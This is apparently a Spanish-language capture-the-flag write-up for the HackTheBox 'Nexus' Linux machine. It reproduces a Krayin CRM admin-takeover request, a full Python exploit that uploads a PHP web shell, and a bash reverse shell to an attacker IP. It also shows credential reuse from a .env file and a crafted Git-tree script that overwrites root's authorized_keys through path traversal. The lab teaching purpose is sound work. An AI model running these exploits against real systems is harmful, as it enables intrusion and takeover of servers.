---
title: Nexus
platform: HackTheBox
difficulty: Easy
os: Linux
releaseDate: 2026-06-23
date: 2026-10-20
publishedAt: 2026-10-21
tags: [Krayin, Gitea, Git, PathTraversal, CVE, RCE, Linux, Easy, HTB]
image: ./thumb.png
imageShape: round
userRank: 6010
rating: 4.2
---

--- 
# Descripcion

Nexus es una máquina Linux de dificultad fácil en Hack The Box que comienza con la enumeración de servicios web y la identificación de subdominios. La explotación de vulnerabilidades en Krayin CRM permite obtener ejecución remota de comandos (RCE) y conseguir acceso inicial como `www-data`. Posteriormente, mediante la enumeración del sistema, se descubren credenciales reutilizadas que permiten acceder por SSH como `jones`. Finalmente, la escalada de privilegios se consigue aprovechando una vulnerabilidad de Path Traversal en un script de sincronización de plantillas de Gitea ejecutado periódicamente como `root`, manipulando un árbol de Git para sobrescribir el archivo `authorized_keys`.

---

# Enumeracion

## Nmap

Comenzamos realizando un escaneo de todos los puertos TCP para identificar los servicios expuestos en la máquina objetivo.

```bash
$ nmap -p- --open --min-rate 5000 -Pn -n -sS -v 10.129.176.156

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-18 22:36 +0200
Initiating SYN Stealth Scan at 22:36
Scanning 10.129.176.156 [65535 ports]
Discovered open port 22/tcp on 10.129.176.156
Discovered open port 80/tcp on 10.129.176.156
Completed SYN Stealth Scan at 22:36, 11.99s elapsed (65535 total ports)
Nmap scan report for 10.129.176.156
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
           Raw packets sent: 65893 (2.899MB) | Rcvd: 65535 (2.621MB)
```

Encontramos dos puertos abiertos:

- **22/tcp:** SSH.
- **80/tcp:** HTTP.

> A continuación, realizamos un segundo escaneo para identificar las versiones de los servicios y ejecutar los scripts predeterminados de Nmap.


```bash
$ nmap -p22,80 -sC -sV 10.129.176.156

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-18 22:37 +0200
Nmap scan report for 10.129.176.156
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds
```

> Observamos que el servicio web redirige a `nexus.htb`, por lo que añadimos este dominio al archivo `/etc/hosts` para poder acceder correctamente a la aplicación.

> Añadimos `nexus.htb` al archivo `/etc/hosts`.

## Web

> Utilizamos `WhatWeb` para identificar las tecnologías empleadas por la aplicación web y recopilar información adicional.

```bash
$ whatweb http://nexus.htb/

http://nexus.htb/ [200 OK] Country[RESERVED][ZZ], Email[careers@nexus.htb,j.matthew@nexus.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.176.156], Script, Title[Nexus Energy Authority — Powering the Nation's Future], nginx[1.24.0]
```

> Encontramos dos direcciones de correo electrónico: `careers@nexus.htb` y `j.matthew@nexus.htb`. La segunda podría estar relacionada con un usuario del sistema, por lo que la tendremos en cuenta durante la enumeración.


> Accedemos a la página principal del dominio.

- Web

  ![Pasted-image-20261018224107.png](./Images/Pasted-image-20261018224107.png)

> Encontramos una página corporativa relacionada con la venta de electricidad.

# Shell como www-data

## Enumeracion

> Continuamos con la enumeración y utilizamos `Gobuster` para intentar descubrir subdominios virtuales asociados al dominio principal.

```bash
$ gobuster vhost -u http://nexus.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 --append-domain
```

![Pasted-image-20261018224257.png](./Images/Pasted-image-20261018224257.png)

> Encontramos dos subdominios: `git.nexus.htb` y `billing.nexus.htb`. Los añadimos al archivo `/etc/hosts` para poder acceder a ellos.

> Si accedemos a `billing.nexus.htb`, encontramos lo siguiente:

![Pasted-image-20261019010830.png](./Images/Pasted-image-20261019010830.png)

## CVE-2026-41452

> Identificamos un panel de **Krayin CRM**. En la parte inferior aparece una barra de depuración de Laravel que muestra las versiones de las tecnologías utilizadas: `Laravel 12.54.1` y `PHP 8.3.6`. Al investigar posibles vulnerabilidades de Krayin, encontramos una vulnerabilidad reciente publicada en 2026.

> [!NOTE]
> **CVE-2026-41452**
>
> Permite a atacantes no autenticados sobrescribir la cuenta del administrador principal mediante una solicitud HTTP POST específica al endpoint de instalación.

> Buscando información sobre esta vulnerabilidad, encontramos un análisis técnico que incluye una prueba de concepto (PoC) sencilla.

```text
https://jivasecurity.com/writeups/krayin-installer-bypass-account-takeover-cve-2026-41452
```

> Utilizamos la siguiente petición para crear una cuenta:

```bash
curl -s -X POST "http://billing.nexus.htb/install/api/admin-config-setup" -H "X-Requested-With: XMLHttpRequest" -d "name=test&email=test@test.com&password=123456789"
```

> A continuación, probamos a iniciar sesión con las nuevas credenciales y conseguimos acceder al panel de administración.

![Pasted-image-20261019012946.png](./Images/Pasted-image-20261019012946.png)

> Una vez dentro, comprobamos que la versión instalada de Krayin es la `2.2.0`.

![Pasted-image-20261019013056.png](./Images/Pasted-image-20261019013056.png)

## CVE-2026-38526

> Al investigar las vulnerabilidades asociadas a esta versión, encontramos otra que permite la ejecución remota de comandos (RCE) y que requiere autenticación.

![Pasted-image-20261019013250.png](./Images/Pasted-image-20261019013250.png)

> [!NOTE]
> **CVE-2026-38526**
>
> Permite a usuarios autenticados subir archivos PHP maliciosos mediante el editor de texto enriquecido TinyMCE, a través del endpoint `/admin/tinymce/upload`, y ejecutar código arbitrario en el servidor.

> Encontramos una PoC que facilita la explotación de esta vulnerabilidad.

```text
https://github.com/NathanHimself/CVE-2026-38526-PoC
```

> Descargamos el script en Python. Lo incluyo a continuación por si el repositorio original dejara de estar disponible; todos los créditos corresponden a su autor.

```python
import requests
import urllib.parse
import argparse
import re
import subprocess
import sys

parser = argparse.ArgumentParser(
    description="CVE-2026-38526 PoC - Krayin CRM RCE",
    formatter_class=argparse.RawTextHelpFormatter,
    epilog="Example:\n  python3 exploit.py -t http://krayin.example.com -u admin@example.com -p password123 -c id\n\nNote: Do not include a trailing slash in the URL."
)

parser.add_argument("-t", required=True, help="Target URL (e.g. http://krayin.example.com)")
parser.add_argument("-u", required=True, help="Username/email")
parser.add_argument("-p", required=True, help="Password")
parser.add_argument("-c", required=True, help="Command to execute")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

TARGET = args.t.rstrip("/")

session = requests.Session()

r = session.get(f"{TARGET}/admin/login")
token_match = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
form_token = token_match.group(1)
xsrf = urllib.parse.unquote(session.cookies.get("XSRF-TOKEN"))

r = session.post(
    f"{TARGET}/admin/login",
    json={
        "_token": form_token,
        "email": args.u,
        "password": args.p
    },
    headers={
        "X-XSRF-TOKEN": xsrf,
        "Referer": f"{TARGET}/admin/login",
        "Accept": "application/json",
        "X-Requested-With": "XMLHttpRequest",
    }
)

xsrf = urllib.parse.unquote(session.cookies.get("XSRF-TOKEN"))

r = session.post(
    f"{TARGET}/admin/tinymce/upload",
    files={
        "file": (
            "shell.php",
            b"<?php system($_GET['cmd']); ?>",
            "image/jpeg"
        )
    },
    headers={"X-XSRF-TOKEN": xsrf}
)

location = r.json().get("location")

if location:
    url = f"{location}?cmd={urllib.parse.quote(args.c)}"
    result = subprocess.run(
        ["curl", "-s", url],
        capture_output=True,
        text=True
    )
    print(result.stdout)
else:
    print(f"[-] Upload failed: {r.status_code}")
```

> Ejecutamos el script para comprobar que podemos explotar la vulnerabilidad.

![Pasted-image-20261019014836.png](./Images/Pasted-image-20261019014836.png)

> Conseguimos ejecutar comandos remotamente como el usuario `www-data`. Ahora vamos a obtener una shell interactiva para facilitar la enumeración del sistema.

## Revshell como www-data

> Primero, ponemos en escucha un puerto en nuestra máquina atacante.

```bash
$ nc -nvlp 7777
```

> A continuación, ejecutamos el script con un comando que establece una conexión inversa hacia nuestra máquina.

```bash
$ python3 test.py -t http://billing.nexus.htb -u test@test.com -p 123456789 -c 'bash -c "bash -i >& /dev/tcp/10.10.15.119/7777 0>&1"'
```

> Recibimos una shell como el usuario `www-data`.

![Pasted-image-20261019020836.png](./Images/Pasted-image-20261019020836.png)

---

# Shell como jones

## Enumeracion

> Comenzamos enumerando los usuarios del sistema que tienen una shell asignada.

```bash
$ cat /etc/passwd | grep "sh"
```

```text
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

> Identificamos dos usuarios interesantes, `jones` y `git`, ambos con `/bin/bash` como shell. A continuación, comprobamos qué directorios personales existen en el sistema.

```bash
$ ls -la /home
```

```text
total 16
drwxr-xr-x  4 root  root  4096 May 12 12:06 .
drwxr-xr-x 23 root  root  4096 May 12 12:06 ..
drwxr-x---  2 git   git   4096 May 12 12:27 git
drwxr-x---  3 jones jones 4096 May 12 12:26 jones
```

> Encontramos los directorios personales de `jones` y `git`. Vamos a enumerar el sistema en busca de posibles credenciales que nos permitan avanzar.

## Contraseña del usuario jones

> Si nos dirigimos al directorio principal de Krayin, encontramos un archivo `.env`, que podría contener información sensible de la aplicación.

```bash
$ ls -la /var/www/krayin
```

```text
total 568
drwxr-xr-x 14 www-data www-data   4096 May 12 12:06 .
drwxr-xr-x  4 root     root       4096 May 12 12:06 ..
-rw-r--r--  1 www-data www-data    220 Mar 17  2026 .editorconfig
-rw-r--r--  1 www-data www-data   1195 Apr 22 22:50 .env
-rw-r--r--  1 www-data www-data  1124 Mar 17  2026 .env.example
-rw-r--r--  1 www-data www-data    186 Mar 17  2026 .gitattributes
-rw-r--r--  1 www-data www-data    455 Mar 17  2026 .gitignore
-rw-r--r--  1 www-data www-data   3353 Mar 17  2026 CODE_OF_CONDUCT.md
-rw-r--r--  1 www-data www-data   1078 Mar 17  2026 LICENSE
-rw-r--r--  1 www-data www-data   5920 Mar 17  2026 README.md
-rw-r--r--  1 www-data www-data   1783 Mar 17  2026 UPGRADE.md
drwxr-xr-x  5 www-data www-data   4096 May 12 12:06 app
-rwxr-xr-x  1 www-data www-data    350 Mar 17  2026 artisan
drwxr-xr-x  3 www-data www-data   4096 May 12 12:06 bootstrap
drwxr-xr-x  5 www-data www-data   4096 May 12 12:06 config
drwxr-xr-x  5 www-data www-data   4096 May 12 12:06 database
-rw-r--r--  1 www-data www-data     32 Mar 17 12:06 example.txt
drwxr-xr-x  3 www-data www-data   4096 May 12 12:06 lang
drwxr-xr-x  3 www-data www-data   216 Mar 17 12:06 packages
-rw-r--r--  1 www-data www-data   1164 Mar 17 12:06 pint.json
drwxrwxr-x  6 www-data www-data   4096 May 12 12:06 storage
drwxr-xr-x 71 www-data www-data   4096 May 12 12:06 vendor
-rw-r--r--  1 www-data www-data   263 Mar 17 12:06 vite.config.js
```

> Comprobamos el contenido del archivo `.env`.

```bash
$ cat /var/www/krayin/.env
```

```dotenv
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD

VITE_HOST=
VITE_PORT=

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=

BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com

MAIL_RECEIVER_DRIVER=sendgrid

IMAP_HOST=imap.example.com
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=your_username
IMAP_PASSWORD=your_password

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

> Encontramos las credenciales de acceso a la base de datos MySQL.

```text
user: krayin
pass: y27xb3ha!!74GbR
```

> Probamos a iniciar sesión por SSH con el usuario `jones`, reutilizando la contraseña encontrada en el archivo `.env`.

```text
user: jones
pass: y27xb3ha!!74GbR
```

```bash
$ ssh jones@10.129.176.156
```

![Pasted-image-20261019030126.png](./Images/Pasted-image-20261019030126.png)

> Conseguimos acceder al sistema como `jones`. Ahora continuamos con la enumeración para identificar posibles vías de escalada de privilegios.

---

# Shell como root

## Enumeracion

> Primero, comprobamos si el usuario `jones` tiene permisos para ejecutar comandos con `sudo`.

```bash
$ sudo -l
[sudo] password for jones:
Sorry, user jones may not run sudo on nexus.
```

> El usuario no tiene permisos para ejecutar comandos mediante `sudo`, por lo que continuamos con la búsqueda de posibles vectores de escalada.

> Buscamos archivos con el bit SUID habilitado, ya que algunos binarios con estos permisos pueden ofrecer vías de escalada de privilegios.

```bash
$ find / -perm -4000 2>/dev/null
```

```text
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
```

> No encontramos ningún binario que nos permita avanzar directamente. Por ello, utilizamos `LinPEAS` para realizar una enumeración más profunda del sistema.

> Durante la enumeración encontramos un `systemd timer` que parece ejecutar una tarea de sincronización cada minuto.

![Pasted-image-20261020012357.png](./Images/Pasted-image-20261020012357.png)

## System timers

> Vamos a comprobar qué hace exactamente este servicio.

```bash
$ cat /etc/systemd/system/gitea-template-sync.service
```

```ini
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

> Observamos que el servicio ejecuta el archivo `template-sync.py` con privilegios de `root`. Comprobamos los permisos del archivo para determinar si podemos modificarlo directamente.

```bash
$ ls -la /etc/gitea/template-sync.py
-rw-r--r-- 1 git git 4184 May 11 18:47 /etc/gitea/template-sync.py
```

> El archivo pertenece al usuario `git`, pero tenemos permisos de lectura. Aunque no podemos modificarlo directamente, podemos analizar su funcionamiento para identificar posibles vulnerabilidades.

## Examinando script python

```python
import os
import sys
import json
import subprocess
import time
import urllib.request

GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"

def log(msg):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = "[%s] %s" % (ts, msg)
    print(line, flush=True)
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, 'a') as f:
            f.write(line + '\n')
    except:
        pass

def load_config():
    config = {}
    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        k, v = line.split('=', 1)
                        config[k.strip()] = v.strip()
        except:
            pass
    return config

def get_token():
    cfg = load_config()
    return cfg.get('GITEA_API_TOKEN')

def get_template_repos(token):
    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL
    req = urllib.request.Request(url, headers={
        'Authorization': 'token %s' % token
    })
    try:
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read())
            repos = data.get('data', data) if isinstance(data, dict) else data
            return [r for r in repos if r.get('template', False)]
    except Exception as e:
        log("API error: %s" % e)
        return []

def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name = repo_info['name'].lower()
    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
    stage_path = os.path.join(STAGING_DIR, owner, name)

    if not os.path.isdir(bare_path):
        log("  repo not found: %s" % bare_path)
        return

    # Read tree entries from the bare repository
    try:
        GIT = ['git', '-c', 'safe.directory=*']
        result = subprocess.run(
            GIT + ['ls-tree', '-r', 'HEAD'],
            cwd=bare_path,
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode != 0:
            log("  ls-tree failed: %s" % result.stderr.strip())
            return
    except Exception as e:
        log("  ls-tree error: %s" % e)
        return

    entries = []
    for line in result.stdout.strip().split('\n'):
        if not line:
            continue
        parts = line.split('\t', 1)
        if len(parts) != 2:
            continue
        meta, filepath = parts
        mode, objtype, objhash = meta.split()
        if objtype == 'blob':
            entries.append((mode, objhash, filepath))

    if not entries:
        log("  no files in template")
        return

    # Extract files to staging directory
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        target_dir = os.path.dirname(target)

        try:
            os.makedirs(target_dir, exist_ok=True)
            GIT = ['git', '-c', 'safe.directory=*']
            cat_result = subprocess.run(
                GIT + ['cat-file', 'blob', objhash],
                cwd=bare_path,
                capture_output=True,
                timeout=10
            )
            if cat_result.returncode != 0:
                continue

            with open(target, 'wb') as f:
                f.write(cat_result.stdout)

            if mode == '100755':
                os.chmod(target, 0o755)
            else:
                os.chmod(target, 0o644)

            log("  synced: %s" % filepath)
        except Exception as e:
            log("  error syncing %s: %s" % (filepath, e))

def main():
    log("Template sync starting")

    token = get_token()
    if not token:
        log("No API token found")
        sys.exit(1)

    templates = get_template_repos(token)
    log("Found %d template repo(s)" % len(templates))

    for repo in templates:
        name = repo['full_name']
        log("Syncing template: %s" % name)
        sync_template(repo)

    log("Template sync complete")

if __name__ == '__main__':
    main()
```

> Hay varias partes interesantes en el código. Empezamos por la función `get_template_repos()`.

```python
def get_template_repos(token):
    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL
    req = urllib.request.Request(url, headers={
        'Authorization': 'token %s' % token
    })
    try:
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read())
            repos = data.get('data', data) if isinstance(data, dict) else data
            return [r for r in repos if r.get('template', False)]
    except Exception as e:
        log("API error: %s" % e)
        return []
```

> Esta función se comunica con la API de Gitea y obtiene los repositorios marcados como plantillas (`template`). Por ejemplo, podría devolver un repositorio como `web-template`.

> A continuación, analizamos la función `sync_template()`, que es donde encontramos el comportamiento interesante.

```python
def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name = repo_info['name'].lower()
    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
    stage_path = os.path.join(STAGING_DIR, owner, name)

    if not os.path.isdir(bare_path):
        log("  repo not found: %s" % bare_path)
        return

    # Read tree entries from the bare repository
    try:
        GIT = ['git', '-c', 'safe.directory=*']
        result = subprocess.run(
            GIT + ['ls-tree', '-r', 'HEAD'],
            cwd=bare_path,
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode != 0:
            log("  ls-tree failed: %s" % result.stderr.strip())
            return
    except Exception as e:
        log("  ls-tree error: %s" % e)
        return

    entries = []
    for line in result.stdout.strip().split('\n'):
        if not line:
            continue
        parts = line.split('\t', 1)
        if len(parts) != 2:
            continue
        meta, filepath = parts
        mode, objtype, objhash = meta.split()
        if objtype == 'blob':
            entries.append((mode, objhash, filepath))

    if not entries:
        log("  no files in template")
        return

    # Extract files to staging directory
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        target_dir = os.path.dirname(target)

        try:
            os.makedirs(target_dir, exist_ok=True)
            GIT = ['git', '-c', 'safe.directory=*']
            cat_result = subprocess.run(
                GIT + ['cat-file', 'blob', objhash],
                cwd=bare_path,
                capture_output=True,
                timeout=10
            )
            if cat_result.returncode != 0:
                continue

            with open(target, 'wb') as f:
                f.write(cat_result.stdout)

            if mode == '100755':
                os.chmod(target, 0o755)
            else:
                os.chmod(target, 0o644)

            log("  synced: %s" % filepath)
        except Exception as e:
            log("  error syncing %s: %s" % (filepath, e))
```

> Lo más importante aquí es la variable `stage_path`, que define el directorio en el que se extraen los archivos de las plantillas. La ruta tiene la siguiente estructura:

```text
/home/git/template-staging/<user>/<rep>/
```

> El posible fallo se encuentra en el tratamiento de las rutas de los archivos que se extraen del repositorio.

```python
for mode, objhash, filepath in entries:
    target = os.path.join(stage_path, filepath)
    target_dir = os.path.dirname(target)

    try:
        os.makedirs(target_dir, exist_ok=True)
        GIT = ['git', '-c', 'safe.directory=*']
        cat_result = subprocess.run(
            GIT + ['cat-file', 'blob', objhash],
            cwd=bare_path,
            capture_output=True,
            timeout=10
        )
        if cat_result.returncode != 0:
            continue

        with open(target, 'wb') as f:
            f.write(cat_result.stdout)

        if mode == '100755':
            os.chmod(target, 0o755)
        else:
            os.chmod(target, 0o644)

        log("  synced: %s" % filepath)
    except Exception as e:
        log("  error syncing %s: %s" % (filepath, e))
```

> El problema está en `os.path.join(stage_path, filepath)`. El script combina la ruta de destino con la ruta del archivo obtenida del repositorio, pero no comprueba que el resultado permanezca dentro del directorio de staging.
>
> Si conseguimos introducir una ruta que permita realizar un *Path Traversal*, cuando se ejecute `with open(target, 'wb') as f`, el proceso podría escribir fuera del directorio previsto. Como el servicio se ejecuta como `root`, esto podría permitir escribir en archivos del sistema a los que un usuario sin privilegios no tendría acceso.

> Como la versión de Git es posterior a la `2.3.5`, no podemos realizar este ataque simplemente utilizando un nombre de archivo con componentes de recorrido de directorios. Por ello, vamos a probar a construir un árbol de Git con directorios anidados llamados `..`.

## Explotacion

> Vamos a iniciar sesión en Gitea con el usuario `jones`.

![Pasted-image-20261020022046.png](./Images/Pasted-image-20261020022046.png)

> Conseguimos acceder. Ahora creamos un repositorio que utilizaremos para introducir el árbol de Git manipulado.

![Pasted-image-20261020022205.png](./Images/Pasted-image-20261020022205.png)

![Pasted-image-20261020023428.png](./Images/Pasted-image-20261020023428.png)

> Le pondré el nombre `test`. Una vez creado, lo clonamos en la máquina utilizando las credenciales de `jones`, de modo que podamos realizar un `git push` posteriormente.
>
> Utilizamos el puerto `3000` porque Gitea está funcionando en ese puerto de forma local.

```bash
$ git clone http://jones:'y27xb3ha!!74GbR'@localhost:3000/jones/test.git
```

### Construcción del árbol de Git manipulado

> Ahora vamos a copiar nuestro archivo `authorized_keys` y colocarlo en el directorio `/tmp` de la máquina víctima.
>
> A continuación, utilizaremos el siguiente script para construir manualmente un árbol de Git que incluya la ruta `../../../../../root/.ssh/authorized_keys`.

```python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo")
    sys.exit(1)

r = subprocess.run(
    ["cat", "/tmp/authorized_keys"],
    capture_output=True,
    text=True
)

key = r.stdout.strip() + "\n"
blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")
ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir = write_obj(entry("40000", "root", cur), "tree")

for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")

root = write_obj(
    entry("100644", "README.md", readme) +
    entry("40000", "..", fir),
    "tree"
)

ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (
    root, ts, ts
)

sha = write_obj(c.encode(), "commit")
os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
```

> Debemos ejecutar el script desde el directorio del repositorio que hemos clonado; en mi caso, dentro de `test`.
>
> Una vez generado el árbol manipulado, realizamos un `push` forzado para subirlo a Gitea.

```bash
$ git push -u origin main --force
```

> Ahora esperamos un minuto para que se ejecute el `systemd timer` encargado de sincronizar las plantillas.
>
> Cuando se procese nuestro repositorio, probaremos a conectarnos por SSH como `root`, utilizando nuestra clave privada `id_rsa`.

```bash
$ ssh root@10.129.177.131 -i id_rsa
```

![Pasted-image-20261020024205.png](./Images/Pasted-image-20261020024205.png)

> **Conseguimos acceso como `root` y completamos la máquina Nexus.**